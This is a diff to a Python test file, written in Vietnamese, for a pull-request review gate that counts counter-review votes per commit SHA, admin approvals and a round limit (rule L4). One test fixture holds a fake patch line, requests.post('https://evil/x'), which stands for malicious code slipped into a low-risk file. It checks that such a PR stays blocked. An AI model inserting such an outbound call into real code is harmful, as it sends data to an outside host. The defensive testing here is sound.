@@ -241,7 +241,7 @@ def vua(ds_duyet=None, **khac):
 
 
 class TestPhieuPhanBac(unittest.TestCase):
-    """Luật L3, L4: mọi PR không Cao cần một phiếu phản bác không bác trên đúng SHA (Alex 1a 06/11: bỏ rút thăm)."""
+    """Luật L3, L4: mọi PR, cả mức Cao, cần một phiếu phản bác không bác trên đúng SHA (Alex 1a 06/11)."""
 
     def test_khong_phieu_thi_chan(self):
         q = quyet_dinh(vua())
@@ -282,12 +282,59 @@ class TestPhieuPhanBac(unittest.TestCase):
         q = quyet_dinh(vua(ds))
         self.assertEqual(q["ket_luan"], CHAN)
         self.assertIn("trần L4", q["ly_do"][0])
-        self.assertEqual(quyet_dinh(vua(ds + [duyet()]))["ket_luan"], CHO_QUA)
+        self.assertEqual(quyet_dinh(vua(ds + [duyet(gio=MUON_HON, body="quyet-l4: đã đọc diff mọi tệp ở thẻ")]))["ket_luan"], CHO_QUA)
 
-    def test_nguoi_admin_duyet_thay_phieu(self):
-        q = quyet_dinh(vua([duyet()]))
+    def test_admin_duyet_khong_thay_phieu(self):
+        # Alex 1a 06/11: mọi mức cần phiếu. Phiếu phản bác thẻ duyệt: PR Cao kèm mã độc ở tệp Thường, admin duyệt
+        # theo thẻ (thẻ không đưa diff tệp Thường) thì trước đây qua mà không ai đọc phần mã đó.
+        doc = tep("src/app.py", patch="@@ -1 +1 @@\n+requests.post('https://evil/x')")
+        for ds_tep in ([tep()], [tep("package.json"), doc], [tep("src/app.py", 401, 0)]):
+            with self.subTest(ds_tep=[t["filename"] for t in ds_tep]):
+                duyet_co = duyet(body="ngoai-le-co: đã đọc thẻ, đổi lớn có chủ đích")
+                q = quyet_dinh(vua([duyet_co], ds_tep=ds_tep))
+                self.assertEqual(q["ket_luan"], CHAN)
+                self.assertIn("phiếu phản bác", " ".join(q["ly_do"]))
+                self.assertEqual(quyet_dinh(vua([duyet_co, phieu()], ds_tep=ds_tep))["ket_luan"], CHO_QUA)
+
+    def test_cao_tran_l4_admin_quyet(self):
+        ds = [phieu("bac", commit=SHA_CU), phieu("bac", commit="c" * 40)]
+        self.assertEqual(quyet_dinh(vua(ds, ds_tep=CAO))["ket_luan"], CHAN)
+        q = quyet_dinh(vua(ds + [duyet(gio=MUON_HON, body="quyet-l4: đã đọc diff mọi tệp ở thẻ")], ds_tep=CAO))
         self.assertEqual(q["ket_luan"], CHO_QUA)
-        self.assertIn("không cần phiếu phản bác", " ".join(q["chi_tiet"]))
+        self.assertIn("trần L4", " ".join(q["chi_tiet"]))
+
+    def test_duyet_truoc_khi_cham_tran_l4_khong_tinh(self):
+        # Phản bác 06/11 (lỗi A): admin duyệt lúc thẻ còn ghi phần Thường «cổng còn chặn», rồi phiếu bác tới chạm trần.
+        ds = [phieu("bac", commit=SHA_CU, gio=SAU), duyet(gio="2026-11-01T11:30:00Z"), phieu("bac", gio=MUON_HON)]
+        for ds_tep in (CAO, None):
+            with self.subTest(ds_tep=ds_tep):
+                khac = {"ds_tep": ds_tep} if ds_tep else {}
+                self.assertEqual(quyet_dinh(vua(ds, **khac))["ket_luan"], CHAN)
+
+    def test_tran_l4_can_dong_quyet_l4(self):
+        # Phản bác lượt 3: review cũ sửa thành bác giữ submitted_at cũ, nên lượt duyệt ghi «sau» chưa chắc đã đọc thẻ L4.
+        ds = [phieu("bac", commit=SHA_CU, gio="2026-11-01T08:00:00Z"), phieu("bac", commit="c" * 40, gio="2026-11-01T09:00:00Z")]
+        for ds_tep in (CAO, None):
+            with self.subTest(ds_tep=ds_tep):
+                khac = {"ds_tep": ds_tep} if ds_tep else {}
+                self.assertEqual(quyet_dinh(vua(ds + [duyet(gio=MUON_HON)], **khac))["ket_luan"], CHAN)
+                co = duyet(gio=MUON_HON, body="quyet-l4: đã đọc diff mọi tệp ở thẻ")
+                self.assertEqual(quyet_dinh(vua(ds + [co], **khac))["ket_luan"], CHO_QUA)
+
+    def test_phieu_bac_khong_co_sha_khong_tinh_vong(self):
+        ds = [phieu("bac", commit=SHA_CU), phieu("bac", commit=None), phieu("bac", commit="")]
+        self.assertEqual(quyet_dinh(vua(ds + [duyet(gio=MUON_HON)], ds_tep=CAO))["ket_luan"], CHAN)
+
+    def test_hai_phieu_bac_cung_sha_la_mot_vong(self):
+        # L4 đếm vòng: bác hai lần trên một SHA chưa chạm trần, admin duyệt không mở được.
+        ds = [phieu("bac"), phieu("bac", gio=MUON_HON)]
+        self.assertEqual(quyet_dinh(vua(ds + [duyet()], ds_tep=CAO))["ket_luan"], CHAN)
+
+    def test_tran_l4_thuong_cung_co_the(self):
+        ds = [phieu("bac", commit=SHA_CU), phieu("bac", commit="c" * 40)]
+        q = quyet_dinh(vua(ds))
+        self.assertTrue(q["tran_l4"])
+        self.assertIn("chạm trần L4", q["the_duyet"])
 
     def test_nguoi_khong_co_quyen_ghi_khong_ghi_duoc_phieu(self):
         self.assertEqual(quyet_dinh(vua([phieu(user="nguoi-la")]))["ket_luan"], CHAN)
